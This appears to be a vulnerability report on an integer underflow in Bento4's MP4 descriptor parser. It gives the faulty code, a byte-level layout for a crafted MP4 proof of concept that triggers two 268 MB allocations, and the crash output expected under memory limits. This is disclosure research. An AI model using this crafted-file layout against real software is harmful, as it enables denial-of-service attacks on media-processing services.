# VULN 001: Integer Underflow in AP4_DecoderConfigDescriptor

## Summary

**CWE**: CWE-191 (Integer Underflow) → CWE-125 (Out-of-bounds Read)
**Status on this system**: UNVERIFIED (underflow fires, crash requires memory pressure)

---

## Root Cause

In `Ap4DecoderConfigDescriptor.cpp`, the parsing constructor unconditionally reads
13 bytes of fields from the stream, then creates a SubStream for any remaining
sub-descriptors:

```cpp
AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(
    AP4_ByteStream& stream, AP4_Size header_size, AP4_Size payload_size)
{
    AP4_Position start;
    stream.Tell(start);

    // Reads 13 bytes regardless of payload_size:
    stream.ReadUI08(m_ObjectTypeIndication);  //  1 byte
    stream.ReadUI08(bits);                    //  1 byte
    stream.ReadUI24(m_BufferSize);            //  3 bytes
    stream.ReadUI32(m_MaxBitrate);            //  4 bytes
    stream.ReadUI32(m_AverageBitrate);        //  4 bytes
                                              // = 13 bytes total

    // VULNERABILITY: AP4_Size is uint32_t.
    // payload_size=5  →  5 - 13  =  0xFFFFFFF8  (integer underflow)
    AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);
    // substream->m_Size == 0xFFFFFFF8 == ~4 GB ← should have been -8
    ...
}
```

The oversize SubStream allows reading far past the declared descriptor boundary.

---

## PoC Design

The crafted `vuln_001.mp4` is a minimal MP4 with an `esds` box whose ES
SubStream byte layout is chosen so that bytes consumed by the greedy 13-byte
field read serve double duty as the leading bytes of a fake
`DecoderSpecificInfo` descriptor (tag=0x05) with expandable size 0x0FFFFFFF
(268,435,455 bytes):

```
ES SubStream positions:
  [0]  0x04        DecoderConfig tag
  [1]  0x05        declared payload_size = 5  (< 13, triggers underflow)
  [2]  0x40        objectTypeIndication             ]
  [3]  0x15        streamType|upStream bits         ] 5 declared
  [4]  0x00        bufferSize[0]                    ] payload bytes
  [5]  0x00        bufferSize[1]                    ]
  [6]  0x00        bufferSize[2]                    ]
  ---- greedy reads begin here (outside declared payload) ----
  [7]  0x05        maxBitrate[0]  =  DSI tag (outer loop sees it here)
  [8]  0xFF        maxBitrate[1]  =  expandable size byte 1
  [9]  0xFF        maxBitrate[2]  =  expandable size byte 2
  [10] 0xFF        maxBitrate[3]  =  expandable size byte 3
  [11] 0x7F        avgBitrate[0]  =  expandable size byte 4  → 0x0FFFFFFF
  [12] 0x00        avgBitrate[1]
  [13] 0x00        avgBitrate[2]
  [14] 0x00        avgBitrate[3]
  ---- inner SubStream begins at start+13 = position 15 ----
  [15] 0x05        2nd fake DSI tag (inner SubStream sees it here)
  [16-19] 0xFF 0xFF 0xFF 0x7F   → 0x0FFFFFFF (268 MB) again
  [20-23] 0xDE 0xAD 0xBE 0xEF  dummy payload
  [24-26] 0x06 0x01 0x02       SLConfigDescriptor
```

This causes two separate 268 MB allocations:

1. **Inner SubStream** (m_Size = 0xFFFFFFF8 due to underflow): reads position 15
   as a DSI descriptor with payload_size = 268 MB.
   `AP4_DecoderSpecificInfoDescriptor` allocates 268 MB via `new AP4_Byte[268M]`.

2. **Outer ES loop**: after DecoderConfig processing, seeks back to position 7
   (offset + header_size + declared_payload_size = 0 + 2 + 5 = 7) and encounters
   the same bytes as a second DSI descriptor with payload_size = 268 MB.
   Another 268 MB is allocated.

Both allocations are confirmed by strace:
```
mmap(NULL, 268443648, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, ...) = ...
mmap(NULL, 268443648, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, ...) = ...
```

---

## Why No Crash on This System

The system has ~992 MB available RAM. Both 268 MB allocations (536 MB total)
succeed without triggering `std::bad_alloc`.

The file-backed `AP4_FileByteStream` prevents a heap OOB by returning EOS when
reads go past the physical file boundary. ASAN does not detect OOB in file I/O.

A crash (VERIFIED_CRASH) would be observed in either of these conditions:

- System RAM ≤ ~300 MB available (bad_alloc terminates the process).
- Running under `ulimit -v` or cgroup memory limit of ≤ ~600 MB.
- Use of `ASAN_OPTIONS=hard_rss_limit_mb=300` to artificially cap resident set.
- A caller that wraps Bento4 with an `AP4_MemoryByteStream` over a fixed buffer
  (still no heap OOB because MemoryByteStream clamps reads, but OOM path is same).

---

## Expected ASAN/Crash Output (memory-constrained environment)

```
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
AddressSanitizer: allocator is out of memory trying to allocate 0x10000000 bytes
```

Or UBSAN (if compiled with `-fsanitize=unsigned-integer-overflow`):
```
runtime error: unsigned integer overflow: 5 - 13 cannot be represented in type 'unsigned int'
```
